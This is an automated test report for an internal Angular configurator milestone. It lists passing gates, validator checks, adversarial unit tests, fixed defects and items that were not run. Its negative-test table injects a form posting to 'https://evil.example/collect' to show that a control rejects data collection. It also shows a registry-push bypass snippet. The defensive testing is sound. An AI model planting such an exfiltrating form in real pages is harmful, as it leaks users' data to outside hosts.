# MC-24 — Automated test report

**Revision bound:** `8a4b5e0202133af67d6f3f632061509b35a5d98b` (`feature/marea-mc24-configurator`)
All results below were **executed**; no stage is reported as passing without a run.

## 1. Result summary

| #   | Gate                                           | Command                                                 | Result                                                 | Exit |
| --- | ---------------------------------------------- | ------------------------------------------------------- | ------------------------------------------------------ | ---- |
| 1   | TypeScript (both projects)                     | `node scripts/run-tsc.mjs`                              | PASS                                                   | 0    |
| 2   | Inherited confined runner                      | `node scripts/test.mjs`                                 | 5/5 stages green                                       | 0    |
| 3   | MC-20/MC-21/MC-22 catalogue validator          | (stage `mc20` of 2)                                     | 56/56 PASS                                             | 0    |
| 4   | MC-23 bundle validator                         | (stage `mc23` of 2)                                     | 15/15 PASS                                             | 0    |
| 5   | MC-23 unit tests                               | (stage `unit` of 2)                                     | 16/16                                                  | 0    |
| 6   | MC-24 projection drift gate                    | `node scripts/build-mc24-configurator-data.mjs --check` | up to date (32 questions, 12 rules, 20 conflict rules) | 0    |
| 7   | MC-24 configuration validator                  | `npm run test:mc24`                                     | **13/13 PASS**                                         | 0    |
| 8   | MC-24 adversarial unit suite                   | `npm run test:mc24:unit`                                | **25/25 pass**                                         | 0    |
| 9   | **Real Angular build gate + negative binding** | `node scripts/check-mc24-build.mjs`                     | **VERDICT: PASS**                                      | 0    |
| 10  | Catalogue E2E (incl. 17 MC-24)                 | `playwright test -c playwright.catalog.config.ts`       | **101 passed**                                         | 0    |
| 11  | Public i18n                                    | `npm run test:i18n`                                     | PASS                                                   | 0    |
| 12  | Public SEO                                     | `npm run test:seo`                                      | PASS (101 sitemap URLs)                                | 0    |
| 13  | Public commerce                                | `npm run test:commerce`                                 | PASS                                                   | 0    |
| 14  | Prettier (MC-24 files)                         | `npx prettier --check <mc24 files>`                     | clean                                                  | 0    |

## 2. The real Angular build gate (MC-23 lesson)

```
=== positive-preview-build: PASS exit 0 (23527ms) ===
=== positive-production-build: PASS exit 0 (25223ms) ===
=== negative-broken-binding-build: EXIT 1 (16803ms) ===
X [ERROR] TS2339: Property 'mc24DeliberatelyMissingBinding' does not exist on type
          'MareaCatalogConfigurator'. [plugin angular-compiler]
=== negative-broken-binding: PASS — invalid template binding rejected by the Angular compiler
                              (mc24DeliberatelyMissingBinding) ===
=== fixture-leak: PASS — no fixture remains in the source tree ===
VERDICT: PASS — preview and production builds succeed AND an invalid template binding is rejected
```

The gate refuses to pass on an unrelated build failure: it requires the diagnostic
to **name the injected member** and to be an Angular template diagnostic. During
development the first version of this gate did pass for the wrong reason (the probe
sandbox failed on a missing import); that was found and corrected before delivery,
which is precisely the failure mode MC-23 shipped.

An earlier real defect was also caught by this gate during development: 37 `TS4111`
template-binding errors, which the plain typecheck would not have surfaced as
Angular failures. They were fixed with one typed `t()` accessor.

## 3. MC-24 configuration validator — 13 checks

| ID      | Check                                                              | Result                         |
| ------- | ------------------------------------------------------------------ | ------------------------------ |
| MC24-01 | Outcome vocabulary is exactly the four D5 §9.2 outcomes            | PASS                           |
| MC24-02 | `ELIGIBLE_SELF_INSTALL` unreachable while no validated rule exists | PASS (12 configs, 0 eligible)  |
| MC24-03 | Unknown/untested input never eligible                              | PASS (5 probes)                |
| MC24-04 | Missing mandatory answers → `INSUFFICIENT_INFORMATION`             | PASS (13 required, 12 pending) |
| MC24-05 | Excluded capabilities → `NOT_SUPPORTED`                            | PASS (3 refusals)              |
| MC24-06 | Triage deterministic, no price/offer/orderable                     | PASS                           |
| MC24-07 | Every string complete in ES and EN                                 | PASS (70 pairs)                |
| MC24-08 | Rule projection matches MC-08 exactly                              | PASS (32/12/20)                |
| MC24-09 | No public route, no indexation surface                             | PASS                           |
| MC24-10 | No price, purchase affordance or lead capture                      | PASS                           |
| MC24-11 | F-01/F-02 rejected, negations preserved                            | PASS (7 rejected, 6 preserved) |
| MC24-12 | Build gate wired (preview, production, MC-24)                      | PASS                           |
| MC24-13 | F-2/F-15 reproducible and recorded                                 | PASS                           |

## 4. Adversarial unit suite — 25 tests

Boundaries attacked rather than exercised:

- `a1` eligible outcome across every bundle × {empty, 3 partial, complete} answers
- `a2` zero validated rules / zero tested rows, asserted as facts
- `a3` vocabulary cannot be extended (`ORDERABLE`, `PURCHASABLE`, `null`, `42`)
- `a4` excluded capability outranks an entirely unanswered questionnaire
- `a5`–`a7` empty capability list, unknown capabilities ignored, blank/whitespace answers
- `a8` mandatory set matches the contract grouping (13 / 22 / 23)
- `a9` contradictory steering answer
- `a10` a complete valid configuration still yields no commercial state
- `a11`–`a14` triage routes, safety escalation, determinism under reversed order, pending fields
- `a15` no outcome outside the contract vocabularies
- `a16`–`a17` every rule and question projected verbatim
- `a18` no public route collision
- `a19` delivered copy carries no prohibited claim
- `a20` honest negations still pass
- `a21` every outcome explained in both locales
- `a22` F-01/F-02 stay closed under paraphrase drift
- `a23` F-16 attribute-quote class stays closed
- `a24` the validated-rule registry is frozen and a push is refused (regression for the mutable-registry bypass)
- `a25` inherited-property answers cannot satisfy the questionnaire

## 5. Playwright — 17 MC-24 tests

| Group                     | Tests | What is proved                                                                                                                                                                             |
| ------------------------- | ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| SSR and isolation         | 5     | 200 + noindex + no canonical/hreflang/OG/JSON-LD for both locales; SSR HTML contains the real configurator and `GQ-01`; health lists both paths; public paths 404; no price/purchase/email |
| Hydration and interaction | 7     | zero console/page errors; classification by real clicks; eligible outcome unreachable after filling every field; excluded capability → not supported; no currency anywhere                 |
| Keyboard                  | 1     | skip-link focus, radio by Space, text entry, submit by Enter                                                                                                                               |
| Accessibility (automated) | 2     | axe 0 critical/serious, initial **and** classified state, ES+EN                                                                                                                            |
| Responsive                | 2     | no horizontal overflow at 320/390/768/1440; identical ES/EN DOM structure                                                                                                                  |

Total with the inherited suite: **101 passed** (84 inherited, 0 failed).

## 6. Defects found and fixed during verification

| Defect                                                                 | Found by                         | Fix                                                                                          |
| ---------------------------------------------------------------------- | -------------------------------- | -------------------------------------------------------------------------------------------- |
| 37 `TS4111` Angular template errors (index-signature member access)    | the real preview build           | single typed `t()` accessor                                                                  |
| Preview route returned 404                                             | MC-24 E2E                        | registered the paths in `app.routes.server.ts` (the `**` catch-all had been swallowing them) |
| Negative build test passed for the wrong reason                        | self-review of the gate          | require the diagnostic to name the injected member                                           |
| MC20-26 failed on the new local `<form>`                               | inherited confined runner        | narrowed the control to a provably local, non-submitting form instead of a blanket ban       |
| MC20-32 flagged the new MC-24 scripts                                  | inherited confined runner        | declared them in the write-scope control rather than bypassing it                            |
| F-16 `display-dimension` false positive on attribute quotes            | MC24-10 check                    | inch-mark branch now requires a non-attribute quote                                          |
| **Mutable registry made `ELIGIBLE_SELF_INSTALL` reachable** (see §6.1) | captain's adversarial self-probe | `Object.freeze` + frozen private decision binding; validator and tests `a24`/`a25` added     |

### 6.1 The mutable-registry bypass (found after the first green run)

An adversarial self-probe — written _after_ the validator, unit suite and E2E were
all green — found that `VALIDATED_SELF_INSTALL_RULES` was exported as a **mutable
array** and read at call time:

```js
VALIDATED_SELF_INSTALL_RULES.push({
  id: 'FAKE',
  matrixRowId: 'X',
  bundleId: 'START',
  requiredAnswers: {},
});
// before the fix: ELIGIBLE_SELF_INSTALL, eligible=true
```

The D5 governance invariant was therefore holding **by convention, not by
construction**, and none of the existing tests attacked the export itself. After
the fix the public export is `Object.freeze([])`, the decision path reads a separate
frozen module-private binding, and the push throws `TypeError`; prototype pollution
of the rule shape also fails to reach the eligible outcome.

This is recorded because it is the strongest evidence that the milestone's own
green results are not self-certifying: the defect was found by attacking the
claim, which is exactly the job of the independent audit.

## 6.2 Negative tests of the gates themselves

A gate that cannot fail is not a gate. Each security-relevant control was attacked
deliberately, and the observed behaviour recorded:

| Control                                        | Attack                                                                  | Observed                                                                                                       |
| ---------------------------------------------- | ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Validated-rule registry (governance invariant) | `push()` a fabricated `ELIGIBLE_SELF_INSTALL` rule                      | **`TypeError`**; outcome stays `INSTALLER_ASSESSMENT_REQUIRED`, `eligible=false`                               |
| Same                                           | Pollute `Object.prototype` with `bundleId`/`requiredAnswers`            | outcome unchanged; pollution cannot reach the eligible path                                                    |
| MC20-26 local-form permission                  | Inject `<form action="https://evil.example/collect" method="post">`     | **FAIL** — `sets a form action`                                                                                |
| Same                                           | Inject `<input type="email" name="email">`                              | **FAIL** — `collects type="email"`                                                                             |
| Real Angular build gate                        | Replace the invalid binding with a harmless attribute (no-op injection) | **VERDICT: FAIL** — `the deliberately invalid template binding BUILT SUCCESSFULLY — the gate cannot detect it` |

The last row is the decisive one: with nothing actually broken the build gate
**refuses to certify**, so its PASS is not a tautology.

After each attack the tree was restored and the gate re-run to confirm the real
green state. The stale evidence file produced during the MC20-26 attacks was
regenerated and committed (`8b86206`) so no false FAIL ships with the branch.

## 7. Not run (reported honestly)

| Item                                             | Status      | Reason                                         |
| ------------------------------------------------ | ----------- | ---------------------------------------------- |
| Screen-reader / assistive-technology testing     | **NOT_RUN** | no AT tooling in this environment; not claimed |
| Manual WCAG 2.2 AA audit                         | **NOT_RUN** | automated checks only                          |
| Mobile-device / real-hardware rendering          | **NOT_RUN** | out of scope for an internal preview           |
| Visual regression baselines for the configurator | **NOT_RUN** | no baseline exists; the preview is internal    |
